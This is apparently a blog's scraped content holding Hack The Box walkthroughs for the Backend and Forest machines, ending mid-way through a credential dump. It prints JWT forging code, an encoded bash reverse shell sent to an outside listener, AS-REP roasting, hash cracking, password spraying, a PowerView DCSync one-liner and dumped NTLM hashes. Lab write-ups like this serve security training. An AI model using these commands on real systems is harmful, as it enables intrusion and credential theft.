ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8 # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins # e.g: \u0026#39;[\u0026#34;http://localhost\u0026#34;, \u0026#34;http://localhost:4200\u0026#34;, \u0026#34;http://localhost:3000\u0026#34;, \\ # \u0026#34;http://localhost:8080\u0026#34;, \u0026#34;http://local.dockertoolbox.tiangolo.com\u0026#34;]\u0026#39; BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = [] @validator(\u0026#34;BACKEND_CORS_ORIGINS\u0026#34;, pre=True) def assemble_cors_origins(cls, v: Union[str, List[str]]) -\u0026gt; Union[List[str], str]: if isinstance(v, str) and not v.startswith(\u0026#34;[\u0026#34;): return [i.strip() for i in v.split(\u0026#34;,\u0026#34;)] elif isinstance(v, (list, str)): return v raise ValueError(v) SQLALCHEMY_DATABASE_URI: Optional[str] = \u0026#34;sqlite:///uhc.db\u0026#34; FIRST_SUPERUSER: EmailStr = \u0026#34;root@ippsec.rocks\u0026#34; class Config: case_sensitive = True settings = Settings() Forging JWT Token Earlier while trying to access /execute/\u0026lt;Command\u0026gt; I got missing debug key error I can forge a JWT with debug option included. On working on this I got error because Of time skew between the target(JWT Token) and my system is too high. So I made this program to display the time stamp from the token import jwt import time import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; decoded_payload = jwt.decode(token, options={\u0026#34;verify_signature\u0026#34;: False}) print(decoded_payload) iat_timestamp = decoded_payload[\u0026#39;iat\u0026#39;] current_time_timestamp = int(time.time()) print(f\u0026#34;iat timestamp: {iat_timestamp}\u0026#34;) print(f\u0026#34;current time timestamp: {current_time_timestamp}\u0026#34;) print(f\u0026#34;iat datetime: {datetime.datetime.fromtimestamp(iat_timestamp)}\u0026#34;) print(f\u0026#34;current datetime: {datetime.datetime.fromtimestamp(current_time_timestamp)}\u0026#34;) This was the output, As we can see the time skew is 3 hours(approx). So I made the code to adapt to the time and forged jwt token import jwt import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; secret = \u0026#34;SuperSecretSigningKey-Hack The Box\u0026#34; leeway = datetime.timedelta(hours=3) decoder = jwt.decode(token, secret, [\u0026#34;HS256\u0026#34;], leeway=leeway) print(decoder) decoder[\u0026#34;debug\u0026#34;] = True # Adding debug option. encoded_token = jwt.encode(decoder, secret, algorithm=\u0026#34;HS256\u0026#34;) #encode the dictionary. print(f\u0026#34;Encoded token: {encoded_token}\u0026#34;) Got the token Using the token, I executed some commands via /api/admin/exec/\u0026lt;command\u0026gt; and It worked\ncurl -v -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/pwd\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Getting reverse shell Encoded bash reverse shell payload into base64.\necho \u0026#39;bash -c \u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.10/6001 \u0026lt;\u0026amp;1\u0026#34;\u0026#39; | base64 Then created this payload, here %20 represents white space in URL encoded form. The raw command here is echo \u0026lt;Base64-encoded-payload\u0026gt; | base64 -d | bash Final payload for reverse shell: curl -s \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTAvNjAwMSA8JjEiCg==%20|%20base64%20-d%20|%20bash\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Opened a netcat listener on my system (nc -lnvp 6001) and got the shell connection, then I upgraded the shell Privilege Escalation # Found a file called uhc.db It had password hash for my accounts and for other but nothing useful There was another interesting file named auth.log. Which had admin logon logs, Also it had a string which seemed out of place. Actually that was the password for root user. Got the Root flag ","date":"10 March 2025","externalUrl":null,"permalink":"/posts/1741592170890-backend-walkthroughhtb/","section":"Posts","summary":"","title":"Backend Walkthrough(Hack The Box)","type":"posts"},{"content":"I\u0026rsquo;m Emp5r0R, and I\u0026rsquo;m into space and cybersecurity. This website? It\u0026rsquo;s my way of sharing all the cool stuff that sparks my curiosity. Ethical hacking isn’t just a skill for me—it’s a mindset. I believe in using my knowledge to learn and explore. You\u0026rsquo;ll often find me on platforms like Hack The Box and Try Hack Me, getting my hands dirty and having fun.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e Don\u0026rsquo;t forget to visit me on Hack The Box. I’ve also built a hash cracker that rivals Hashcat in speed. While it currently supports fewer hashing algorithms, I’m actively improving it—stay tuned!\nEmp5r0R/BananaCracker This is a super fast hash password cracker, which can take any password dictionary file as input for the purpose of cracking. Rust 2 0 ","date":"7 March 2025","externalUrl":null,"permalink":"/about/","section":"Secure The Throne","summary":"Learn more about me and why I started this site.","title":"$WHOAMI","type":"page"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/tags/database/","section":"Tags","summary":"","title":"Database","type":"tags"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/categories/ethical-hacking/","section":"Categories","summary":"","title":"Ethical Hacking","type":"categories"},{"content":" Reconnaissance and Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 15:46:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: Hack The Box) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49976/tcp open msrpc Microsoft Windows RPC It\u0026rsquo;s always good to look for low hanging fruit, So checked SMB for guest or anonymous login but there isn\u0026rsquo;t any. Same with LDAP When it\u0026rsquo;s comes to enumeration my goto tool is always netexec. Netexec provides many options for Active Directory enumeration. I queried LDAP, ❯ netexec ldap htb.local -u anonymous -p anonymous SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) LDAP 10.10.10.161 389 FOREST [-] htb.local\\anonymous:anonymous Queried SMB, got nothing ❯ netexec smb htb.local -u sundeity -p \u0026#39;\u0026#39; SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\sundeity: STATUS_LOGON_FAILURE Which was weird for an easy box, this triggered lot of questions inside me. On searching the web I found about a new technique. Apparently I can enumerate rpc using rpcclient. If you are more interested about this i\u0026rsquo;ll leave the articles link\nLinks to the Articles Article-1 Article-2\nUsing null login to connect with rpc rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.161 Using the below command I can enumerate users on the domain enumdomusers Output: rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] As I got the users now I copied all the users into a file. So that I can enumerate further with it. ❯ cat users.txt Administrator krbtgt sebastein lucinda svc-alfresco andy mark santi Like this isn\u0026rsquo;t enough we can also enumerate for groups in the domain using below command by querying RPC enumdomgroups We can also query information of a particular group with this command querygroup \u0026lt;sid\u0026gt; Now to our real path, I used kerbrute to verify the usernames that I got from RPC earlier and all of them were legit 🤗 ❯ kerbrute userenum --dc htb.local -d htb.local users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 01/13/25 - Ronnie Flathers @ropnop 2025/01/13 22:04:00 \u0026gt; Using KDC(s): 2025/01/13 22:04:00 \u0026gt; htb.local:88 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tAdministrator@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tandy@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tlucinda@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsanti@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsvc-alfresco@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tmark@htb.local 2025/01/13 22:04:00 \u0026gt; Done! Tested 8 usernames (6 valid) in 0.198 seconds Exploitation # As I was desperatly looking for a low hanging fruit I checked user accounts that had DONT_REQUIRE_PREAUTH. Lucky me I got one user which is none other than svc-alfresco. This Pre-Auth concept is pretty simple let\u0026rsquo;s learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password. Now, in Kerberos 5, a password is required, which is called “Pre-Authentication.” When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required. But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration. Using below the tool below I abused it and got the TGT from kerberos for i in $(cat users.txt); do GetNPUsers.py -no-pass htb.local/${i} -dc-ip 10.10.10.161; done Output: Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for Administrator /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for krbtgt /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for sebastein /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for lucinda /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for svc-alfresco /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) \u0026lt;Hash-Redacted\u0026gt; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for andy /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for mark /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for santi /home/n_emperor/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set To get the password I cracked the TGT using hashcat and got the password hashcat -a 0 hash /usr/share/wordlists/rockyou.txt Output: Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......\u0026lt;redacted\u0026gt;:\u0026lt;Password-Redacted\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4...fc3980 Time.Started.....: Mon Jan 13 21:57:43 2025 (1 sec) Time.Estimated...: Mon Jan 13 21:57:44 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6121.8 kH/s (1.69ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 4096000/14344385 (28.55%) Rejected.........: 0/4096000 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: s9039554h -\u0026gt; s/nd/0s Hardware.Mon.#1..: Temp: 66c Util: 25% Now I have full access over user svc-alfresco (Password is not redacted down here, Enjoy!😉). I initiated password spraying attack on SMB. This is what I usually do when I get a new password. But I didn\u0026rsquo;t get any hit on other accounts, Which is sad 😥 to be honest. ❯ netexec smb htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --shares --continue-on-success SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\Administrator:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\krbtgt:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\sebastein:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\lucinda:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [+] htb.local\\svc-alfresco:s3rvice SMB 10.10.10.161 445 FOREST [-] htb.local\\andy:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\mark:s3rvice STATUS_LOGON_FAILURE SMB 10.10.10.161 445 FOREST [-] htb.local\\santi:s3rvice STATUS_LOGON_FAILURE I tried the same on WinRM service and guess what, Bingo! Got winrm access. Even if I got any hit on other accounts earlier it would have been hectic to pivot, hey! anyway less steps to work. ❯ netexec winrm htb.local -u users.txt -p \u0026#39;s3rvice\u0026#39; --continue-on-success WINRM 10.10.10.161 5985 FOREST [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\Administrator:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\krbtgt:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\sebastein:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\lucinda:s3rvice WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!) WINRM 10.10.10.161 5985 FOREST [-] htb.local\\andy:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\mark:s3rvice WINRM 10.10.10.161 5985 FOREST [-] htb.local\\santi:s3rvice Got the User flag ❯ evil-winrm -u svc-alfresco -p s3rvice -i htb.local Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; type ../Desktop/user.txt \u0026lt;redacted\u0026gt; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; Privilege escalation # Now using the user account svc_alfresco I collected data for Bloodhound As we can see from the above picture we have genericAll and writeDACL to abuse. We can use the steps from Bloodhound it\u0026rsquo;s pretty neat. Invoking powerview within the shell Import-Module .\\powerview.ps1 This is the one liner Add-DomainGroupMember -Identity \u0026#39;Exchange Windows Permissions\u0026#39; -Members svc-alfresco; $username = \u0026#34;htb\\svc-alfresco\u0026#34;; $password = \u0026#34;s3rvice\u0026#34;; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity \u0026#39;svc-alfresco\u0026#39; -TargetIdentity \u0026#39;Hack The Box.LOCAL\\Domain Admins\u0026#39; -Rights DCSync Atlast I can run secrets dump to dump all those secrets secretsdump.py svc-alfresco:s3rvice@10.10.10.161 Output Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:\u0026lt;redacted\u0026gt;::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a::: htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9::: htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555::: htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5::: htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff::: htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203::: htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355::: htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536::: htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:665b84ebfa60399418c8be430aa5704e::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed htb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913 htb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375 htb.local\\Administrator:des-cbc-md5:c1e049c71f57343b krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 htb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4 htb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e htb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e htb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf htb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd htb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e htb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e htb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed htb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983 htb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91 htb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f htb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a htb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c htb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8 htb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d htb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81 htb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6 htb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5 htb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a htb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2 